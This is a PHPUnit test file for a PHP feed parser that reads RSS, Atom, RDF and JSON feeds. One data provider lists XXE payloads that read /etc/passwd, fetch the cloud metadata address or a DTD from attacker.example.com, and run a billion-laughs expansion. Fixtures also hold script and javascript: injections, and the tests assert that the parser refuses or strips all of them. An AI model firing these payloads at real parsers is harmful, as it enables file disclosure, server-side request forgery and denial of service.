<?php

declare(strict_types=1);

namespace AiBlog\Tests\Unit\Fetching;

use AiBlog\Fetching\Exceptions\FeedUnreadable;
use AiBlog\Fetching\Feeds\FeedFormat;
use AiBlog\Fetching\Feeds\FeedParser;
use AiBlog\Fetching\FetchedDocument;
use Carbon\CarbonImmutable;
use PHPUnit\Framework\Attributes\DataProvider;
use AiBlog\Tests\TestCase;

class FeedParserTest extends TestCase
{
    private const FEED_URL = 'https://blog.example.com/feed.xml';

    public function test_it_reads_rss_2(): void
    {
        $rss = <<<'XML'
            <?xml version="1.0" encoding="UTF-8"?>
            <rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
              <channel>
                <title>Example &amp; Co blog</title>
                <link>https://blog.example.com/</link>
                <item>
                  <title>First &lt;b&gt;post&lt;/b&gt;</title>
                  <link>/posts/first</link>
                  <guid isPermaLink="false">post-1</guid>
                  <pubDate>Tue, 03 Mar 2026 10:00:00 +0000</pubDate>
                  <description><![CDATA[<p>Hello <script>alert(1)</script>world</p>]]></description>
                </item>
                <item>
                  <title>Only a permalink guid</title>
                  <guid>https://blog.example.com/posts/second</guid>
                  <dc:date>2026-03-05T08:00:00Z</dc:date>
                  <content:encoded><![CDATA[<div>Body</div>]]></content:encoded>
                </item>
                <item>
                  <title>No link at all</title>
                  <guid isPermaLink="false">orphan</guid>
                </item>
                <item>
                  <title>Bad scheme</title>
                  <link>javascript:alert(1)</link>
                </item>
              </channel>
            </rss>
            XML;

        $feed = (new FeedParser)->parse($rss, self::FEED_URL);

        $this->assertSame(FeedFormat::Rss, $feed->format);
        $this->assertSame('Example & Co blog', $feed->title);
        $this->assertSame('https://blog.example.com/', $feed->homePageUrl);
        $this->assertCount(2, $feed->items);
        $this->assertFalse($feed->truncated);

        [$first, $second] = $feed->items;
        $this->assertSame([
            'url' => 'https://blog.example.com/posts/first',
            'guid' => 'post-1',
            'title' => 'First post',
            'published_at' => '2026-03-03T10:00:00+00:00',
            'summary' => 'Hello world',
        ], $first->toArray());

        $this->assertSame('https://blog.example.com/posts/second', $second->url);
        $this->assertSame('https://blog.example.com/posts/second', $second->guid);
        $this->assertSame('2026-03-05', $second->publishedAt?->toDateString());
        $this->assertSame('Body', $second->summary);
    }

    public function test_it_reads_atom(): void
    {
        $atom = <<<'XML'
            <?xml version="1.0" encoding="utf-8"?>
            <feed xmlns="http://www.w3.org/2005/Atom">
              <title type="text">Atom blog</title>
              <link rel="self" href="https://blog.example.com/atom.xml"/>
              <link href="https://blog.example.com/"/>
              <entry>
                <title>Atom entry</title>
                <link rel="edit" href="https://blog.example.com/edit/1"/>
                <link rel="alternate" type="text/html" href="entries/1"/>
                <id>tag:blog.example.com,2026:1</id>
                <updated>2026-02-02T00:00:00Z</updated>
                <published>2026-02-01T00:00:00Z</published>
                <summary type="html">&lt;p&gt;A summary&lt;/p&gt;</summary>
              </entry>
            </feed>
            XML;

        $feed = (new FeedParser)->parse($atom, self::FEED_URL);

        $this->assertSame(FeedFormat::Atom, $feed->format);
        $this->assertSame('Atom blog', $feed->title);
        $this->assertSame('https://blog.example.com/', $feed->homePageUrl);
        $this->assertSame('https://blog.example.com/entries/1', $feed->items[0]->url);
        $this->assertSame('tag:blog.example.com,2026:1', $feed->items[0]->guid);
        $this->assertSame('2026-02-01', $feed->items[0]->publishedAt?->toDateString());
        $this->assertSame('A summary', $feed->items[0]->summary);
    }

    public function test_it_reads_rss_1_rdf(): void
    {
        $rdf = <<<'XML'
            <?xml version="1.0"?>
            <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns="http://purl.org/rss/1.0/" xmlns:dc="http://purl.org/dc/elements/1.1/">
              <channel rdf:about="https://blog.example.com/"><title>RDF blog</title><link>https://blog.example.com/</link></channel>
              <item rdf:about="https://blog.example.com/r/1"><title>RDF item</title><link>https://blog.example.com/r/1</link><dc:date>2026-01-01</dc:date></item>
            </rdf:RDF>
            XML;

        $feed = (new FeedParser)->parse($rdf, self::FEED_URL);

        $this->assertSame(FeedFormat::Rdf, $feed->format);
        $this->assertSame('RDF blog', $feed->title);
        $this->assertSame('https://blog.example.com/r/1', $feed->items[0]->guid);
        $this->assertSame('RDF item', $feed->items[0]->title);
    }

    public function test_it_reads_json_feed(): void
    {
        $json = json_encode([
            'version' => 'https://jsonfeed.org/version/1.1',
            'title' => 'JSON blog',
            'home_page_url' => 'https://blog.example.com/',
            'items' => [
                ['id' => 1, 'url' => 'https://blog.example.com/j/1', 'title' => 'JSON item', 'date_published' => '2026-04-01T12:00:00Z', 'content_html' => '<p>Hi <em>there</em></p>'],
                ['id' => '2', 'external_url' => '/j/2', 'content_text' => 'Text only'],
                ['id' => '3'],
                'not an object',
            ],
        ]);

        $feed = (new FeedParser)->parse((string) $json, 'https://blog.example.com/feed.json');

        $this->assertSame(FeedFormat::Json, $feed->format);
        $this->assertSame('JSON blog', $feed->title);
        $this->assertCount(2, $feed->items);
        $this->assertSame('1', $feed->items[0]->guid);
        $this->assertSame('Hi there', $feed->items[0]->summary);
        $this->assertSame('https://blog.example.com/j/2', $feed->items[1]->url);
        $this->assertNull($feed->items[1]->title);
    }

    public function test_it_bounds_the_item_count_and_field_lengths(): void
    {
        $items = '';

        for ($index = 0; $index < 30; $index++) {
            $items .= '<item><title>'.str_repeat('t', 1000).'</title><link>https://blog.example.com/'.$index.'</link><description>'.str_repeat('d', 5000).'</description></item>';
        }

        $feed = (new FeedParser)->parse('<rss version="2.0"><channel>'.$items.'</channel></rss>', self::FEED_URL, maxItems: 10);

        $this->assertCount(10, $feed->items);
        $this->assertTrue($feed->truncated);
        $this->assertSame(300, mb_strlen((string) $feed->items[0]->title));
        $this->assertSame(1000, mb_strlen((string) $feed->items[0]->summary));
    }

    /**
     * @return array<string, array{string}>
     */
    public static function xxePayloads(): array
    {
        return [
            'external file entity' => ['<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><rss version="2.0"><channel><item><title>&xxe;</title><link>https://a.example.com/</link></item></channel></rss>'],
            'external http entity' => ['<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><rss version="2.0"><channel><title>&xxe;</title></channel></rss>'],
            'parameter entity' => ['<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY % remote SYSTEM "http://attacker.example.com/x.dtd"> %remote;]><rss version="2.0"><channel/></rss>'],
            'billion laughs' => ['<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><rss version="2.0"><channel><title>&lol3;</title></channel></rss>'],
            'external dtd' => ['<?xml version="1.0"?><!DOCTYPE rss SYSTEM "http://attacker.example.com/rss.dtd"><rss version="2.0"><channel/></rss>'],
            'lower-case doctype with whitespace' => ["<?xml version=\"1.0\"?>\n<!  doctype rss [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><rss><channel><title>&x;</title></channel></rss>"],
        ];
    }

    #[DataProvider('xxePayloads')]
    public function test_it_refuses_documents_with_a_doctype_or_entities(string $payload): void
    {
        $this->expectException(FeedUnreadable::class);
        $this->expectExceptionMessage('DOCTYPE or entities are refused');

        (new FeedParser)->parse($payload, self::FEED_URL);
    }

    /**
     * @return array<string, array{string}>
     */
    public static function malformedFeeds(): array
    {
        return [
            'empty' => [''],
            'whitespace' => ["  \n "],
            'truncated xml' => ['<rss version="2.0"><channel><item><title>oops'],
            'html page' => ['<html><body>Not a feed</body></html>'],
            'rss without channel' => ['<rss version="2.0"></rss>'],
            'atom root in the wrong namespace' => ['<feed><entry/></feed>'],
            'plain json' => ['{"hello": "world"}'],
            'json feed without items' => ['{"version": "https://jsonfeed.org/version/1.1", "title": "x"}'],
            'broken json' => ['{"version": '],
            'deeply nested json' => ['{"version":"https://jsonfeed.org/version/1","items":'.str_repeat('[', 100).str_repeat(']', 100).'}'],
            'binary' => ["\x00\x01\x02\x03"],
        ];
    }

    #[DataProvider('malformedFeeds')]
    public function test_it_refuses_malformed_or_foreign_documents(string $body): void
    {
        $this->expectException(FeedUnreadable::class);

        (new FeedParser)->parse($body, self::FEED_URL);
    }

    public function test_it_reads_a_fetched_document_against_its_final_url(): void
    {
        $body = '<rss version="2.0"><channel><item><link>/p/1</link></item></channel></rss>';
        $document = new FetchedDocument(
            requestedUrl: 'https://old.example.com/rss',
            finalUrl: 'https://new.example.com/rss',
            status: 200,
            contentType: 'application/rss+xml',
            body: $body,
            sha256: hash('sha256', $body),
            fetchedAt: CarbonImmutable::now(),
        );

        $this->assertSame('https://new.example.com/p/1', (new FeedParser)->parseDocument($document)->items[0]->url);
    }
}
